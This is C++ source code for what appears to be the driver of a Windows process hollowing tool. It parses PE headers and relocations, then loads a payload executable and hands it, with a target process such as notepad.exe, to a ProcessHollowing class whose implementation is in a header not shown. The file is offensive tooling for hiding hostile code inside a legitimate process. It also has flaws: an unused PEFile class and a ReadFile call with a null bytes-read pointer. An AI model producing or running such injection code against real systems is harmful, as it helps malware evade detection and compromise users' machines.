#include <Windows.h>
#include <winternl.h>
#include <cstdio>
#include <string>
#include <memory>
#include <optional>
#include <filesystem>
#include <vector>
#include <fstream>
#include <iostream>

#include "process_hollowing.hpp"

class PEFile {
public:
	struct RelocationEntry {
		WORD offset : 12;
		WORD type : 4;
	};

	static std::optional<std::unique_ptr<PEFile>> Load(const std::string& filePath) {
		auto instance = std::make_unique<PEFile>();
		if (!instance->LoadFile(filePath)) {
			return std::nullopt;
		}
		return instance;
	}

	bool IsValid() const {
		const auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(m_content.get());
		const auto ntHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<uintptr_t>(dosHeader) + dosHeader->e_lfanew);
		return ntHeader->Signature == IMAGE_NT_SIGNATURE;
	}

	DWORD GetSubsystem64() const {
		const auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(m_content.get());
		const auto ntHeader = reinterpret_cast<PIMAGE_NT_HEADERS64>(reinterpret_cast<uintptr_t>(dosHeader) + dosHeader->e_lfanew);
		return ntHeader->OptionalHeader.Subsystem;
	}

	bool HasRelocation64() const {
		const auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(m_content.get());
		const auto ntHeader = reinterpret_cast<PIMAGE_NT_HEADERS64>(reinterpret_cast<uintptr_t>(dosHeader) + dosHeader->e_lfanew);
		return ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0;
	}

	IMAGE_DATA_DIRECTORY GetRelocAddress64() const {
		const auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(m_content.get());
		const auto ntHeader = reinterpret_cast<PIMAGE_NT_HEADERS64>(reinterpret_cast<uintptr_t>(dosHeader) + dosHeader->e_lfanew);
		if (ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0) {
			return ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
		}
		return { 0, 0 };
	}

	LPVOID GetContent() const { return m_content.get(); }

private:
	struct ContentDeleter {
		void operator()(LPVOID ptr) {
			if (ptr) {
				HeapFree(GetProcessHeap(), 0, ptr);
			}
		}
	};

	std::unique_ptr<void, ContentDeleter> m_content;

	bool LoadFile(const std::string& filePath) {
		const auto hFile = CreateFileA(filePath.c_str(), GENERIC_READ, 0, nullptr, OPEN_EXISTING, 0, nullptr);
		if (hFile == INVALID_HANDLE_VALUE) {
			printf("[-] Failed to open PE file\n");
			return false;
		}

		const auto fileSize = GetFileSize(hFile, nullptr);
		if (fileSize == INVALID_FILE_SIZE) {
			printf("[-] Failed to get PE file size\n");
			CloseHandle(hFile);
			return false;
		}

		auto fileContent = HeapAlloc(GetProcessHeap(), 0, fileSize);
		if (!fileContent) {
			printf("[-] Failed to allocate memory for PE file content\n");
			CloseHandle(hFile);
			return false;
		}

		if (!ReadFile(hFile, fileContent, fileSize, nullptr, nullptr)) {
			printf("[-] Failed to read PE file content\n");
			CloseHandle(hFile);
			HeapFree(GetProcessHeap(), 0, fileContent);
			return false;
		}

		CloseHandle(hFile);
		m_content.reset(fileContent);
		return true;
	}
};

int main(int argc, char* argv[]) {
	if (argc != 3) {
		printf("Usage: %s <pe_file> <target_process>\n", argv[0]);
		printf("Example: %s payload.exe C:\\Windows\\System32\\notepad.exe\n\n", argv[0]);
		return -1;
	}

	if (!std::filesystem::exists(argv[1])) {
		printf("[-] Error: PE file '%s' does not exist\n", argv[1]);
		return -1;
	}

	if (!std::filesystem::exists(argv[2])) {
		printf("[-] Error: Target process '%s' does not exist\n", argv[2]);
		return -1;
	}

	printf("[+] Reading PE file: %s\n", argv[1]);
	std::ifstream file(argv[1], std::ios::binary);
	if (!file) {
		printf("[-] Failed to open PE file: %s\n", argv[1]);
		return -1;
	}

	std::vector<BYTE> peBytes(
		(std::istreambuf_iterator<char>(file)),
		std::istreambuf_iterator<char>());

	file.close();

	if (peBytes.empty()) {
		printf("[-] Failed to read PE file content\n");
		return -1;
	}

	printf("[+] PE file size: %zu bytes\n", peBytes.size());
	printf("[+] Target process: %s\n", argv[2]);
	printf("[+] Attempting process hollowing...\n");

	ProcessHollowing processHollowing(peBytes, argv[2]);
	bool success = processHollowing.Execute();

	if (success) {
		printf("[+] Process hollowing completed successfully\n");
		return 0;
	} else {
		printf("[-] Process hollowing failed\n");
		return -1;
	}
}